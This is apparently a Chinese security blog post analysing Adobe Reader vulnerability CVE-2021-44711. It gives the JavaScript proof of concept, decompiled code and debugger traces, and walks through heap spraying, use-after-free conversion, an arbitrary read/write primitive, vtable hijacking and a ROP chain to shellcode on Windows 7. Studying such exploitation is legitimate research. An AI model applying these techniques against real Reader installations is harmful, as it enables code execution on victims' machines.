@@ -1,0 +1,448 @@
+I">_<h1 id="前言">前言</h1>
+
+<p>最近看到一篇<a href="https://vul.360.net/archives/434">Adobe Reader 漏洞 CVE-2021-44711 利用浅析</a>漏洞分析文章，打算从该漏洞开始学习PDF类型漏洞的分析与利用，根据文章的分析思路写出EXP。<!--more-->分析使用的软件版本为：<code class="language-plaintext highlighter-rouge">Adobe Acrobat Reader DC 2021.007.20099(x86)</code>。</p>
+
+<h1 id="漏洞分析">漏洞分析</h1>
+
+<p>漏洞通过PDF内嵌的js代码触发，POC代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var _obj = {};
+_obj[-1] = null;
+var _annot = this.addAnnot({page:0, type:"Line", points:_obj});
+</code></pre></div></div>
+
+<p>POC非常简单，关键就在于Annotation 对象的 points属性原本应该由两个点<code class="language-plaintext highlighter-rouge">{[x1,y1],[x2,y2]}</code>组成的，代表Annotation对象直线的起点和终点。然而poc的代码将-1作为下标，在进行类型转换时导致了越界访问造成漏洞。</p>
+
+<p>类型转换函数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//函数偏移：Annots.api+0x32EC6
+if ( (int *)v11 != result )
+    {
+      do
+      {
+        index_str = (char *)(*(int (__thiscall **)(_DWORD, _DWORD))(dword_22747430 + 0x1C))(
+                              *(_DWORD *)(dword_22747430 + 0x1C),
+                              *(unsigned __int16 *)(v11 + 0x10));
+        index_num = atoi_0(this_1, index_str);  // 转换字符下标为数字下标，将-1转化为0xffffffff
+        v26 = 0x30;
+        arraysize = v25[1] - *v25;
+        HIDWORD(v21) = *v25;
+        v22 = index_num;
+        if ( arraysize / 0x30 &lt;= index_num )    // 如果数组对象的数量小于当前下标的值，则重新分配数组大小，此时index_num为0xfffffff &gt; 0
+          resize(index_num + 1, var_11);   	// 根据下标重新分配数组大小
+        sub_2212379A(v11 + 0x18);               // 类型转换
+        result = (int *)sub_2212A202(&amp;v23);
+        v11 = (int)v23;
+      }
+      while ( v23 != *v4 );
+</code></pre></div></div>
+
+<p>函数首先将字符下标index_str转换为数字下标index_num，随后判断当前下标是否大于目前数组对象的数量（0x30为单个数组对象的大小），如果大于则需要重新分配数组的大小。resize函数接收下标+1代表实际要访问的对象数量，resize函数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int __thiscall resize(_DWORD *this, unsigned int index, int arg_4)
+{
+  unsigned int Array_Num; // eax
+  int target; // esi
+
+  Array_Num = (this[1] - *this) / 0x30;		//由于Array为空，因此Array_Num=0
+  if ( index &gt;= Array_Num )			//此时index为0，而Array_Num=0，因此直接返回当前数组大小为0
+  {
+    if ( index &gt; Array_Num )                    // 如果当前下标+1大于数组对象的数量，则需要重新分配数组大小
+    {
+      if ( index &lt;= (this[2] - *this) / 0x30 )
+      {
+        Array_Num = sub_2216FDF1(this[1], index - Array_Num);// 扩充array的大小符合index+1
+        this[1] = Array_Num;
+      }
+      else
+      {
+        Array_Num = sub_2216FD0D(this, index, arg_4);// 检查index大于0x5555555时则抛出异常
+      }
+    }
+  }
+  else
+  {
+    target = *this + 0x30 * index;
+    Array_Num = sub_2213A435(target, this[1]);
+    this[1] = target;
+  }
+  return Array_Num;
+}
+</code></pre></div></div>
+
+<p>当index为-1时，由于数组本身为空，因此resize函数中传入的index为0，而Array_Num也为0，因此直接返回了0作为实际的数组大小：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//执行完resize之后，此时ecx为this，即array的指针，eax为返回的resize后数组对象的个数
+0:000&gt; dd ecx L4									//array中为空
+08d615b8  00000000 00000000 00000000 00000000
+0:000&gt; p
+eax=00000000 ebx=07074508 ecx=00000000 edx=00000000 esi=08d7b840 edi=08d615b8
+eip=6e873049 esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+Annots!PlugInMain+0x15219:
+6e873049 8b07            mov     eax,dword ptr [edi]  ds:002b:08d615b8=00000000		//获取array的起始地址
+0:000&gt; p
+eax=00000000 ebx=07074508 ecx=00000000 edx=00000000 esi=08d7b840 edi=08d615b8
+eip=6e87304b esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+Annots!PlugInMain+0x1521b:
+6e87304b 8b4dd4          mov     ecx,dword ptr [ebp-2Ch] ss:002b:0034bfdc=ffffffff	//获取index
+0:000&gt; 
+eax=00000000 ebx=07074508 ecx=ffffffff edx=00000000 esi=08d7b840 edi=08d615b8
+eip=6e87304e esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+Annots!PlugInMain+0x1521e:
+6e87304e eb03            jmp     Annots!PlugInMain+0x15223 (6e873053)
+0:000&gt; p
+eax=00000000 ebx=07074508 ecx=ffffffff edx=00000000 esi=08d7b840 edi=08d615b8
+eip=6e873053 esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+Annots!PlugInMain+0x15223:
+6e873053 6bc930          imul    ecx,ecx,30h	//计算当前下标对象距离array起始地址的大小，index*0x30
+0:000&gt; 
+eax=00000000 ebx=07074508 ecx=ffffffd0 edx=00000000 esi=08d7b840 edi=08d615b8	
+eip=6e873056 esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei ng nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
+Annots!PlugInMain+0x15226:
+6e873056 83c618          add     esi,18h		//然而当前index乘0x30后得到0xffffffd0，是个错误的大小
+0:000&gt; 
+eax=00000000 ebx=07074508 ecx=ffffffd0 edx=00000000 esi=08d7b858 edi=08d615b8
+eip=6e873059 esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
+Annots!PlugInMain+0x15229:
+6e873059 56              push    esi
+0:000&gt; 
+eax=00000000 ebx=07074508 ecx=ffffffd0 edx=00000000 esi=08d7b858 edi=08d615b8
+eip=6e87305a esp=0034bfbc ebp=0034c008 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
+Annots!PlugInMain+0x1522a:
+6e87305a 03c8            add     ecx,eax	//将array的起始地址加上当前下标对象距离，得到当前下标对象的地址，由于取到错误的大小导致拿到了错误的值
+0:000&gt; 
+eax=00000000 ebx=07074508 ecx=ffffffd0 edx=00000000 esi=08d7b858 edi=08d615b8
+eip=6e87305c esp=0034bfbc ebp=0034c008 iopl=0         nv up ei ng nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
+Annots!PlugInMain+0x1522c:
+6e87305c e83907ffff      call    Annots!PlugInMain+0x596a (6e86379a)	//调用该函数进行类型转换，传入了错误了对象地址
+0:000&gt; 
+(f00.92c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=70f6f258 ebx=ffffffd0 ecx=ffffffd0 edx=00000000 esi=00000000 edi=ffffffd0
+eip=6e863a2d esp=0034bf5c ebp=0034bf84 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202
+Annots!PlugInMain+0x5bfd:
+6e863a2d 833f01          cmp     dword ptr [edi],1    ds:002b:ffffffd0=????????	//函数内部在获取当前下标对象时出现了访问异常
+</code></pre></div></div>
+
+<p>最终在执行类型转换函数时获取当前下标对象的地址：*this + index * 0x30时，获取到了错误的值0xffffffd0造成了访问异常。</p>
+
+<h1 id="漏洞利用">漏洞利用</h1>
+
+<p>导致崩溃的原因是因为Annotation 对象的 points属性为空，导致获取目标index对象时直接访问了index * 0x30的地址。因此修改POC如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var _annot = this.addAnnot({page:0, type:"Line"});
+var _obj = {};
+_obj[2] = 2;
+_annot.points = _obj;
+_obj[-1] = null;
+_annot.points = _obj;
+</code></pre></div></div>
+
+<p>下断于resize函数，可以看到此时Array不再为空，大小为0x90：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; pc
+eax=00000000 ebx=070616a8 ecx=070d6288 edx=00000000 esi=0706cf38 edi=070d6288
+eip=70803044 esp=002fbbe8 ebp=002fbc38 iopl=0         nv up ei pl nz ac po cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000213
+Annots!PlugInMain+0x15214:
+70803044 e83ecc0300      call    Annots!PlugInMain+0x51e57 (7083fc87)	//resize函数
+0:000&gt; dd ecx l4				//Array _obj
+070d6288  0700d8a0 0700d930 0700d930 00000000
+0:000&gt; ? 0700d930 - 0700d8a0 			//Array Size = 0x90
+Evaluate expression: 144 = 00000090
+</code></pre></div></div>
+
+<p>随后继续执行到类型转换函数，在获取当前下标对象的地址时，由于array不为空能够直接获取到array的起始地址，最终获取的结果正好为_obj[-1]，造成了内存越界访问：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; P
+eax=002fbb78 ebx=070616a8 ecx=ea9f14a7 edx=0000000b esi=0706cf38 edi=070d6288
+eip=70803049 esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
+Annots!PlugInMain+0x15219:
+70803049 8b07            mov     eax,dword ptr [edi]  ds:002b:070d6288=0700d8a0		//获取array的起始地址，此时不为0
+0:000&gt; p
+eax=0700d8a0 ebx=070616a8 ecx=ea9f14a7 edx=0000000b esi=0706cf38 edi=070d6288
+eip=7080304b esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
+Annots!PlugInMain+0x1521b:
+7080304b 8b4dd4          mov     ecx,dword ptr [ebp-2Ch] ss:002b:002fbc0c=ffffffff	//获取index
+0:000&gt; p
+eax=0700d8a0 ebx=070616a8 ecx=ffffffff edx=0000000b esi=0706cf38 edi=070d6288
+eip=7080304e esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
+Annots!PlugInMain+0x1521e:
+7080304e eb03            jmp     Annots!PlugInMain+0x15223 (70803053)
+0:000&gt; p
+eax=0700d8a0 ebx=070616a8 ecx=ffffffff edx=0000000b esi=0706cf38 edi=070d6288
+eip=70803053 esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
+Annots!PlugInMain+0x15223:
+70803053 6bc930          imul    ecx,ecx,30h	//计算当前下标对象距离array起始地址的大小，index*0x30
+0:000&gt; p
+eax=0700d8a0 ebx=070616a8 ecx=ffffffd0 edx=0000000b esi=0706cf38 edi=070d6288
+eip=70803056 esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei ng nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
+Annots!PlugInMain+0x15226:
+70803056 83c618          add     esi,18h
+0:000&gt; p
+eax=0700d8a0 ebx=070616a8 ecx=ffffffd0 edx=0000000b esi=0706cf50 edi=070d6288
+eip=70803059 esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
+Annots!PlugInMain+0x15229:
+70803059 56              push    esi
+0:000&gt; p
+eax=0700d8a0 ebx=070616a8 ecx=ffffffd0 edx=0000000b esi=0706cf50 edi=070d6288
+eip=7080305a esp=002fbbec ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
+Annots!PlugInMain+0x1522a:
+7080305a 03c8            add     ecx,eax	//获取当前下标对象的地址为_obj[-1]，即*this - 0x30
+0:000&gt; 
+eax=0700d8a0 ebx=070616a8 ecx=0700d870 edx=0000000b esi=0706cf50 edi=070d6288
+eip=7080305c esp=002fbbec ebp=002fbc38 iopl=0         nv up ei pl nz na po cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000203
+Annots!PlugInMain+0x1522c:
+7080305c e83907ffff      call    Annots!PlugInMain+0x596a (707f379a)	//类型转换函数
+0:000&gt; dd ecx L30
+//_obj[-1]，该块内存为越界读访问的内容
+0700d870  00000000 00000000 00000000 00000000
+0700d880  00010000 00000000 00010000 7217beb0
+0700d890  0704eea8 80000000 0b758404 88007010
+//_obj[0]
+0700d8a0  00000000 0055005c 00000000 00000000
+0700d8b0  0041005c 006d0064 006e0069 00730069
+0700d8c0  00720074 00740061 00000000 0041005c
+//_obj[1]
+0700d8d0  00000000 00610044 00000000 00000000
+0700d8e0  0061006f 0069006d 0067006e 0041005c
+0700d8f0  006f0064 00650062 00000000 00720063
+//_obj[2]
+0700d900  00000000 00740061 00000000 40000000
+0700d910  004d0054 006f0044 00730063 0073002e
+0700d920  00760061 00760000 00000000 00000000
+</code></pre></div></div>
+
+<h2 id="内存越界访问转化为uaf">内存越界访问转化为UAF</h2>
+
+<p>只是内存越界访问无法利用，然而在类型转换函数<code class="language-plaintext highlighter-rouge">sub_2212379A</code>中会根据*this的不同调用不同的转换函数：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220908120809935.png" alt="image-20220908120809935" /></p>
+
+<p>分析这些转换函数后发现*this=0x1a时执行的函数内调用free函数释放了位于*(this+8)的内存：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220908143515273.png" alt="image-20220908143515273" /></p>
+
+<p>接下来的利用思路就是将内存越界访问转化为UAF，具体的步骤如下：</p>
+
+<ol>
+  <li>通过堆喷大小为0x1ffd的Array对象占位稳定的内存地址0x20000048，使得后续漏洞触发释放该块内存</li>
+  <li>再次堆喷大小为0x10大小的Array对象布局内存，使得漏洞触发时*this=0x1a，*(this+8) = 0x20000048，漏洞触发后内存地址被释放</li>
+</ol>
+
+<p>主要的难点在于如何构造0x10大小的Array对象布局内存，上面的分析可以得出obj对象占用的内存大小为0x90。因此只需要堆喷0x90大小的对象，并制造内存空洞，就可以让_obj对象精确的位于两个精心构造的内存之间：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x00  -&gt;  +---------------------+
+          | 	   Array	|
+0x90  -&gt;  +---------------------+
+          |        free         |  &lt;------ _obj
+0x120 -&gt;  +---------------------+
+          |        Array        |
+0x1b0 -&gt;  +---------------------+
+          |        free         |
+0x240 -&gt;  +---------------------+
+          |        Array        |
+0x2d0 -&gt;  +---------------------+
+</code></pre></div></div>
+
+<p>因此需要堆喷的0x10大小的Array对象内存布局如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>js:
+fakelement = new Array(0x10);
+fakelement[11] = 0x1a;
+fakelement[12] = 0x20000048;
+
+0:000&gt; dd 07e21608 L26
+//fakelement_01
+07e21608  00000000 0000000d 00000010 00000010
+07e21618  00000000 ffffff84 00000000 ffffff84
+07e21628  00000000 ffffff84 00000000 ffffff84
+07e21638  00000000 ffffff84 00000000 ffffff84
+07e21648  00000000 ffffff84 00000000 ffffff84
+07e21658  00000000 ffffff84 00000000 ffffff84
+07e21668  00000000 ffffff84 0000001a ffffff81
+07e21678  20000048 ffffff81 00000000 00000000
+07e21688  00000000 00000000 00000000 00000000
+07e21698  62334f4b 88000000
+//fakelement_02
+0:000&gt; dd 07e216a0  L26
+07e216a0  00000000 0000000d 00000010 00000010
+07e216b0  00000000 ffffff84 00000000 ffffff84
+07e216c0  00000000 ffffff84 00000000 ffffff84
+07e216d0  00000000 ffffff84 00000000 ffffff84
+07e216e0  00000000 ffffff84 00000000 ffffff84
+07e216f0  00000000 ffffff84 00000000 ffffff84
+07e21700  00000000 ffffff84 0000001a ffffff81
+07e21710  20000048 ffffff81 00000000 00000000
+07e21720  00000000 00000000 00000000 00000000
+07e21730  62334f7e 88000000
+</code></pre></div></div>
+
+<p>从相邻的Array对象内存布局可以看出每个Array对象以8个字节的数据隔开，因此当_obj占位于被释放的Array对象时，_obj[-1]正好访问的是上一个Array对象的0x1a：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; dd 06e19250 - 0x30 L30
+//_obj[-1]
+06e19220  0000001a ffffff81 20000048 ffffff81
+06e19230  00000000 00000000 00000000 00000000
+06e19240  00000000 00000000 2922eb66 88000000
+//_obj[0]
+06e19250  00000000 0000000d 00000000 00000000
+06e19260  00000000 ffffff84 00000000 ffffff84
+06e19270  00000000 ffffff84 00000000 ffffff84
+06e19280  00000000 ffffff84 00000000 00000000
+06e19290  00000000 ffffff84 00000000 ffffff84
+06e192a0  00000000 ffffff84 00000000 ffffff84
+06e192b0  00000000 ffffff84 00000000 40000000
+06e192c0  20000048 ffffff81 00000000 00000000
+06e192d0  00000000 00000000 00000000 00000000
+</code></pre></div></div>
+
+<p>接着执行类型转换的函数可以看到当前this指针正好指向_obj[-1]，下断在free函数，传入的参数正是0x20000048：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
+Breakpoint 1 hit
+eax=0015c0d4 ebx=06e19220 ecx=06e19220 edx=06e19220 esi=00000000 edi=06e19220
+eip=705e89d1 esp=0015c0c4 ebp=0015c0f4 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+Annots!PlugInMain+0xaba1:
+705e89d1 55              push    ebp
+0:000&gt; dd ecx Lc
+06e19220  0000001a ffffff81 20000048 ffffff81
+06e19230  00000000 00000000 00000000 00000000
+06e19240  00000000 00000000 2922eb66 88000000
+0:000&gt; g
+eax=20000048 ebx=06e19220 ecx=06e19220 edx=0000001a esi=00000000 edi=0015c0d4
+eip=7436f7e0 esp=0015bf8c ebp=0015bf94 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
+ucrtbase!free:
+7436f7e0 8bff            mov     edi,edi
+0:000&gt; dps esp L2
+0015bf8c  705dd041 Annots+0x1d041
+0015bf90  20000048		//free的内存地址
+</code></pre></div></div>
+
+<p>到这一步，漏洞已经从越界内存访问转变为了UAF，剩下的就是利用释放的内存构造读写原语了。</p>
+
+<h2 id="任意内存读写原语的构造">任意内存读写原语的构造</h2>
+
+<p>目前已经有一个被释放的0x1ffe大小的Array对象，因此用0xffe8大小的ArrayBuffer对象占位同一块内存。由于Array对象和ArrayBuffer对象表示长度属性的内存在同一位置，这样就导致了Array对象的长度被扩展为0xffe8，因此能够越界读写下一个临近Array对象的length值了：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; dd 20000048 L10		//Array对象初始长度为0x1ffd
+20000048  00000000 00001ffd 00001ffd 00001ffd
+20000058  00000000 ffffff81 00000000 ffffff81
+20000068  00000000 ffffff81 00000000 ffffff81
+20000078  00000000 ffffff81 00000000 ffffff81
+0:000&gt; dd 20000048 L10		//内存占用后长度为0xffe8
+20000048  00000000 0000ffe8 07631450 00000000
+20000058  41414141 ffffff81 00000000 00000000
+20000068  00000000 00000000 00000000 00000000
+20000078  00000000 00000000 00000000 00000000
+</code></pre></div></div>
+
+<p>但是Array对象读写内存的能力不如ArrayBuffer，于是释放掉下一个临近的Array对象，并用ArrayBuffer对象占用内存，随后利用越界读写的Array对象修改ArrayBuffer对象的长度为0xffffff81：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:018&gt; dd 20000048+0x10000 L10
+20010048  00000000 ffffff81 091910e0 00000000
+20010058  41414141 ffffff81 00000000 00000000
+20010068  00000000 00000000 00000000 00000000
+20010078  00000000 00000000 00000000 00000000
+</code></pre></div></div>
+
+<p>至此就获得了长度为0xffffff81的任意地址读写原语，不过该ArrayBuffer的起始地址为0x20010058，如果需要读写起始地址之前的数据，则必须将目的地址 + 0xffffffff + 1，得到的值再通过读写原语进行读写就可以成功写入了。</p>
+
+<h2 id="代码执行">代码执行</h2>
+
+<p>有了任意内存读写原语后，接下来就可以获取函数地址构造ROP链了。构造好后需要劫持对象的虚表实现，步骤如下：</p>
+
+<ol>
+  <li>获取任意内存读写原语的虚表地址</li>
+  <li>修改虚表地址为ROP指令，进行栈置换</li>
+  <li>修改shellcode内存属性为可读可写可执行</li>
+  <li>跳转到shellcode执行，完成利用</li>
+</ol>
+
+<p>读写原语的虚表地址可以通过对象头的信息获取：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:014&gt; dd 20010048 L10
+20010048  00000000 ffffff81 076910e0 00000000
+20010058  41414141 ffffff81 00000000 00000000
+20010068  00000000 00000000 00000000 00000000
+20010078  00000000 00000000 00000000 00000000
+0:014&gt; dps 076910e0 L4
+076910e0  07627448
+076910e4  07625ac0
+076910e8  00000000
+076910ec  674d9540 EScript!double_conversion::DoubleToStringConverter::kBase10MaximalLength+0xae630
+0:014&gt; dps 07627448 L4
+07627448  0763f628
+0762744c  00000004
+07627450  3affffff
+07627454  00000040
+0:014&gt; dps 0763f628 L4
+0763f628  674d45e8 EScript!double_conversion::DoubleToStringConverter::kBase10MaximalLength+0xa96d8
+0763f62c  07628090
+0763f630  00000000
+0763f634  06893c18
+0:014&gt; dps 674d45e8 L8	//读写原语虚表
+674d45e8  67429e18 EScript!double_conversion::DoubleToStringConverter::ToPrecision+0x3a0a8
+674d45ec  9c000521
+674d45f0  6727ad70 EScript!mozilla::HashBytes+0x9020
+674d45f4  67363bb0 EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x9b870
+674d45f8  6727ad70 EScript!mozilla::HashBytes+0x9020	//只需要修改该处的地址为ROP指令地址，即可实现虚表劫持
+674d45fc  6727ad70 EScript!mozilla::HashBytes+0x9020
+674d4600  6727ad70 EScript!mozilla::HashBytes+0x9020
+674d4604  6727ad70 EScript!mozilla::HashBytes+0x9020
+</code></pre></div></div>
+
+<p>ROP指令则可以选择EScript+0x10539d处的指令，将栈地址迁移到0x5d000001。只需要在0x5d000001处填写好VirtualProtect的函数地址和对应的参数即可修改shellcode的内存属性为可执行，并跳转到shellcode执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:013&gt; g
+Breakpoint 0 hit
+eax=06d54ea0 ebx=00000000 ecx=6712539d edx=6712539d esi=0034c4c0 edi=06dfe0e8
+eip=6712539d esp=0034c3f8 ebp=0034c488 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
+EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x9d05d:
+6712539d bc0100005d      mov     esp,5D000001h
+0:000&gt; p
+eax=06d54ea0 ebx=00000000 ecx=6712539d edx=6712539d esi=0034c4c0 edi=06dfe0e8
+eip=671253a2 esp=5d000001 ebp=0034c488 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
+EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x9d062:
+671253a2 c3              ret
+0:000&gt; dps esp L6
+5d000001  75bd435f kernel32!VirtualProtect
+5d000005  20010070 //shellcode
+5d000009  20010058 
+5d00000d  00000700
+5d000011  00000040
+5d000015  2001006c
+</code></pre></div></div>
+
+<p>不过在执行shellcode时发现普通的shellcode调用WinExec会执行失败，调试后发现执行到ZwCreateUserProcess时参数内有堆喷的垃圾数据，怀疑因为这些数据导致执行失败，更换shellcode为syscall执行ZwCreateUserProcess后成功调用。</p>
+
+<p>该代码执行方式无法绕过CFG，最终在Windows7上完成了漏洞利用：</p>
+
+<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/44711.gif" alt="" /></p>
+
+<h1 id="总结">总结</h1>
+
+<p>该漏洞利用难点在于如何将漏洞从越界内存访问转化为UAF，后续的利用过程和其他同类型漏洞大同小异。在利用过程中也得到了文章作者李双师傅的帮助，学习到了Adobe漏洞的利用技巧。</p>
+:ET
